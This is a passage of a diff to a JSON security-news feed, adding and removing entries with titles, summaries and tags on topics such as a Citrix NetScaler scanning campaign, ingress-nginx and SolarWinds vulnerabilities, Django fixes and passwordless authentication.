enterprise Reaching true passwordless authentication in a hybrid environment means accepting that you\u2019re building a new security model, not just changing how users authenticate. The effort required is substantial, but the security improvement is profound. I\u2019ve watched organizations move from breach-heavy authentication scenarios to Zero Trust architectures where every access request is evaluated in context, and where the compromise of a single device doesn\u2019t cascade into wholesale account takeover. The passwordless journey isn\u2019t a destination you reach in months \u2014 it\u2019s a direction you move in consistently. The organizations that succeed view passwordless migration not as a project with an end date, but as a fundamental shift in how they think about identity and trust. They maintain that momentum by continuously updating policies, expanding coverage to new applications and use cases, and refining their architecture as technology evolves. The view from the other side is worth the journey. Once you\u2019ve lived in a passwordless environment, going back to password-based authentication feels like removing your seatbelt during a drive. The risk seems obvious in retrospect, and the safety you\u2019ve gained becomes non-negotiable. This article is published as part of the Foundry Expert Contributor Network. Want to join?",
+      "link": "https://www.csoonline.com/article/4126694/zero-trust-in-practice-a-deep-technical-dive-into-going-fully-passwordless-in-hybrid-enterprise-environments.html",
+      "source": "CSO Online",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T10:00:00+00:00",
+      "published_ts": 1770199200,
+      "smart_groups": [
+        "Curated",
+        "Ransomware",
+        "Vulnerabilities / CVEs",
+        "Windows / Microsoft",
+        "Cloud / SaaS",
+        "Identity / Access",
+        "Network / OT / ICS",
+        "Phishing / Social Engineering",
+        "Crypto / Web3"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Unexamined Leadership Behaviors as CEOs and CISOs Balance Cybersecurity Investments - Hacia Atherton - BSW #433",
+      "summary": "",
+      "link": "https://www.scworld.com/podcast-segment/14431-unexamined-leadership-behaviors-as-ceos-and-cisos-balance-cybersecurity-investments-hacia-atherton-bsw-433",
+      "source": "SCM feed for Latest",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T10:00:00+00:00",
+      "published_ts": 1770199200,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Unexamined Leadership Behaviors as CEOs and CISOs Balance Cybersecurity Investments - Hacia Atherton - BSW #433",
+      "summary": "For decades, leadership was judged by outputs such as profit, speed, and results. But the real competitive advantage now lies beneath the surface of your P&L: Your culture, trust, and psychology driving every decision, including cybersecurity. Hacia Atherton, the author of The Billion Dollar Blind$pot, joins Business Security Weekly to discuss the invisible human costs \u2014 fear, burnout, disengagement \u2014 quietly draining performance. She will discuss the silent costs of outdated leadership and gives you a playbook to fix them for good, including: Self Leadership Psychological Success with Emotional Mastery Co-designing a Culture to Thrive Leaders need to turn emotional intelligence into a measurable business strategy. Because emotional intelligence isn't optional anymore, it's operational. Segment Resources: https://www.haciaatherton.com/ https://www.haciaatherton.com/billion-dollar-blindspot https://www.instagram.com/hacia.atherton/ In the leadership and communications segment, CEOs and CISOs differ on AI's security value and risks, How to strategically balance cybersecurity investments, Succeeding as an Outsider in a Legacy Culture, and more! Visit https://www.securityweekly.com/bsw for all the latest episodes! Show Notes: https://securityweekly.com/bsw-433",
+      "link": "https://podcast.securityweekly.com/unexamined-leadership-behaviors-as-ceos-and-cisos-balance-cybersecurity-investments-hacia-atherton-bsw-433",
+      "source": "Security Weekly Podcast Network (Audio)",
+      "type": "podcasts",
+      "type_label": "Podcasts & YouTube",
+      "published": "2026-02-04T10:00:00+00:00",
+      "published_ts": 1770199200,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs"
       ],
       "curated": true
     },
@@ -199,6 +394,20 @@
       "curated": false
     },
     {
+      "title": "Hackers Actively Scanning Citrix NetScaler Infrastructure to Discover Login Panels",
+      "summary": "A large-scale reconnaissance campaign targeting Citrix ADC Gateway and NetScaler Gateway infrastructure was detected between January 28 and February 2, 2026, by the GreyNoise Global Observation Grid. The coordinated operation combined residential proxy rotation for login panel discovery with concentrated AWS-hosted version disclosure scanning, generating over 111,834 sessions from more than 63,000 unique IP addresses. [\u2026] The post Hackers Actively Scanning Citrix NetScaler Infrastructure to Discover Login Panels appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/scanning-citrix-netscaler-login/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T08:47:17+00:00",
+      "published_ts": 1770194837,
+      "smart_groups": [
+        "Cloud / SaaS"
+      ],
+      "curated": false
+    },
+    {
       "title": "Security Analysis of Moltbook Agent Network: Bot-to-Bot Prompt Injection and Data Leaks",
       "summary": "Wiz and Permiso have analyzed the AI agent social network and found serious security issues and threats. The post Security Analysis of Moltbook Agent Network: Bot-to-Bot Prompt Injection and Data Leaks appeared first on SecurityWeek .",
       "link": "https://www.securityweek.com/security-analysis-of-moltbook-agent-network-bot-to-bot-prompt-injection-and-data-leaks/",
@@ -276,6 +485,38 @@
       "curated": true
     },
     {
+      "title": "Ingress-Nginx Vulnerability Allow Attackers to Execute Arbitrary Code",
+      "summary": "A critical security vulnerability has been discovered in ingress-nginx, a popular Kubernetes ingress controller, that could allow authenticated attackers to execute arbitrary code and access sensitive cluster secrets. The vulnerability, tracked as CVE-2026-24512, affects multiple versions of the software and requires immediate action from administrators. The security flaw exists in the rules.http.paths.path field of the Ingress resource, which [\u2026] The post Ingress-Nginx Vulnerability Allow Attackers to Execute Arbitrary Code appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/ingress-nginx-vulnerability/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T08:22:01+00:00",
+      "published_ts": 1770193321,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Cloud / SaaS"
+      ],
+      "curated": true
+    },
+    {
+      "title": "CISA Warns of SolarWinds Web Help Desk RCE Vulnerability Exploited in Attacks",
+      "summary": "An urgent warning regarding a critical remote code execution (RCE) vulnerability in SolarWinds Web Help Desk. The vulnerability, tracked as CVE-2025-40551, exploits unsafe deserialization of untrusted data and could allow attackers to execute arbitrary commands on affected systems without requiring authentication. CVE-2025-40551 is a deserialization vulnerability classified under CWE-502 (Deserialization of Untrusted Data). The flaw [\u2026] The post CISA Warns of SolarWinds Web Help Desk RCE Vulnerability Exploited in Attacks appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/solarwinds-web-help-desk-rce-vulnerability-2/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T08:19:41+00:00",
+      "published_ts": 1770193181,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Exploit / PoC"
+      ],
+      "curated": true
+    },
+    {
       "title": "Detectify Internal Scanning finds and fixes vulnerabilities behind the firewall",
       "summary": "Detectify has launched Internal Scanning, a solution that eliminates the visibility gap between external perimeters and internal environments, allowing security teams to discover and remediate vulnerabilities behind the firewall with the same speed and precision they apply to external assets. Organizations have been considering the internal network as a safe room. Detectify challenges this dangerous courtesy: compromised endpoints and lateral movement have turned internal-facing apps (like staging environments and admin panels) into prime targets. Internal \u2026 More \u2192 The post Detectify Internal Scanning finds and fixes vulnerabilities behind the firewall appeared first on Help Net Security .",
       "link": "https://www.helpnetsecurity.com/2026/02/04/detectify-internal-scanning-finds-and-fixes-vulnerabilities-behind-the-firewall/",
@@ -286,6 +527,22 @@
       "published_ts": 1770193097,
       "smart_groups": [
         "Vulnerabilities / CVEs"
+      ],
+      "curated": false
+    },
+    {
+      "title": "Critical Django Vulnerabilities Enables DoS and SQL Injection Attacks",
+      "summary": "The development team has issued urgent security updates to fix six critical vulnerabilities affecting multiple versions of the popular Python web framework. The flaws, which include three high-severity SQL injection vulnerabilities and multiple denial-of-service vectors, impact Django versions 4.2, 5.2, 6.0, and the main development branch. Three of the disclosed vulnerabilities carry high-severity ratings and [\u2026] The post Critical Django Vulnerabilities Enables DoS and SQL Injection Attacks appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/django-vulnerabilities/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T08:16:50+00:00",
+      "published_ts": 1770193010,
+      "smart_groups": [
+        "Vulnerabilities / CVEs",
+        "Cloud / SaaS",
+        "Web / API Security"
       ],
       "curated": false
     },
@@ -119746,81 +120003,6 @@
       "type_label": "OSINT, Communities & Subreddits",
       "published": "2026-01-05T10:39:59+00:00",
       "published_ts": 1767609599,
-      "smart_groups": [],
-      "curated": false
-    },
-    {
-      "title": "Threat Group \u2018Crimson Collective\u2019 Allegedly Claim Breach of Largest Fiber Broadband Brightspeed",
-      "summary": "Brightspeed, one of America\u2019s leading fiber broadband infrastructure providers, has become the latest victim of a significant cyberattack. The threat group known as Crimson Collective has publicly claimed responsibility for breaching the company\u2019s systems and obtaining sensitive data. Brightspeed operates across 20 states with network infrastructure capable of serving 7.3 million homes and businesses, making [\u2026] The post Threat Group \u2018Crimson Collective\u2019 Allegedly Claim Breach of Largest Fiber Broadband Brightspeed appeared first on Cyber Security News .",
-      "link": "https://cybersecuritynews.com/crimson-collective-allegedly-claim-breach-of-brightspeed/",
-      "source": "Cyber Security News (FeedBurner)",
-      "type": "general",
-      "type_label": "General Security & Blogs",
-      "published": "2026-01-05T10:33:51+00:00",
-      "published_ts": 1767609231,
-      "smart_groups": [],
-      "curated": false
-    },
-    {
-      "title": "European Space Agency Confirms Server Breach",
-      "summary": "The European Space Agency has said that external servers were recently involved in a security \u201cissue\u201d",
-      "link": "https://www.infosecurity-magazine.com/news/european-space-agency-confirms/",
-      "source": "Infosecurity Magazine \u2013 News",
-      "type": "general",
-      "type_label": "General Security & Blogs",
-      "published": "2026-01-05T10:15:00+00:00",
-      "published_ts": 1767608100,
-      "smart_groups": [],
-      "curated": false
-    },
-    {
-      "title": "How we test robot vacuums at ZDNET in 2026",
-      "summary": "Testing a robot vacuum involves a lot of patience, experimenting, and watching a robot roll around the floor, but it can make a big difference in a buyer's decision.",
-      "link": "https://www.zdnet.com/article/how-we-test-robot-vacuums/",
-      "source": "ZDNet \u2013 Security",
-      "type": "general",
-      "type_label": "General Security & Blogs",
-      "published": "2026-01-05T10:00:42+00:00",
-      "published_ts": 1767607242,
-      "smart_groups": [],
-      "curated": false
-    },
-    {
-      "title": "First ISO 27001 baseline interview soon we started with CIS v8 from zero. Anyone else done this path?",
-      "summary": "Hey everyone, I\u2019ve got my first baseline interview for ISO 27001 coming up and I\u2019m honestly a bit nervous. Our org basically started at 0 on security maturity, so instead of jumping straight into ISO we began with the CIS Controls v8 framework because it felt more practical and easier to get momentum. It helped us structure things fast: basic hygiene, asset inventory, access control, logging, awareness, etc. Now we\u2019re switching gears toward ISO 27001 certification, and I\u2019m hoping the work we did with CIS means we\u2019re actually closer than it feels even if we didn\u2019t build everything \u201cISO-first\u201d. What we\u2019re doing right now. Writing extra documentation per CIS safeguard, like procedures + policies (so it\u2019s not just \u201cwe do it\u201d, but also \u201chere\u2019s how and who owns it\u201d) Questions for people who\u2019ve done ISO 27001: If you started with CIS, did it translate well into ISO 27001? Or did you hit big gaps? What are the common pitfalls in that first baseline interview? What documents/processes were the auditor most focused on early (risk assessment? SoA? governance? evidence?) Any tips to stay calm and not overshare / undersell what we already have? submitted by /u/heartgoldt20 [link] [comments]",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1q4hroc/first_iso_27001_baseline_interview_soon_we/",
-      "source": "/r/cybersecurity",
-      "type": "osint",
-      "type_label": "OSINT, Communities & Subreddits",
-      "published": "2026-01-05T10:00:37+00:00",
-      "published_ts": 1767607237,
-      "smart_groups": [],
-      "curated": false
-    },
-    {
-      "title": "Why are cybersecurity predictions so bad? - ESW #440",
-      "summary": "For our first episode of the new year, we thought it would be appropriate to dig into some cybersecurity predictions. First, we cover the very nature of predictions and why they're often so bad. To understand this, we get into logical fallacies and cognitive biases. In the next segment, we cover some 2025 predictions we found on the Internet. In the final segment, we discuss 2026, drop some of our own predictions, and talk about what we hope to see this year. SPOILER: Please fix session hijacking, okay tech industry? Segment resources: A great site for better understanding logical fallacies and cognitive biases Visit https://www.securityweekly.com/esw for all the latest episodes! Show Notes: https://securityweekly.com/esw-440",
-      "link": "https://podcast.securityweekly.com/why-are-cybersecurity-predictions-so-bad-esw-440",
-      "source": "Security Weekly Podcast Network (Audio)",
-      "type": "podcasts",
-      "type_label": "Podcasts & YouTube",
-      "published": "2026-01-05T10:00:00+00:00",
-      "published_ts": 1767607200,
-      "smart_groups": [
-        "Curated",
-        "Vulnerabilities / CVEs"
-      ],
-      "curated": true
-    },
-    {
-      "title": "Can BTC avoid a bull trap at $93K? 5 things to know in Bitcoin this week",
-      "summary": "Bitcoin hit $93,000 for the first time in nearly a month on Venezuela volatility, but BTC price forecasts include a sweep of $80,000 lows.",
-      "link": "https://cointelegraph.com/news/can-btc-avoid-bull-trap-93k-5-things-bitcoin-this-week?utm_source=rss_feed&utm_medium=rss&utm_campaign=rss_partner_inbound",
-      "source": "Cointelegraph.com News",
-      "type": "crypto",
-      "type_label": "Crypto & Blockchain Security",
-      "published": "2026-01-05T09:51:58+00:00",
-      "published_ts": 1767606718,
       "smart_groups": [],
       "curated": false
     },
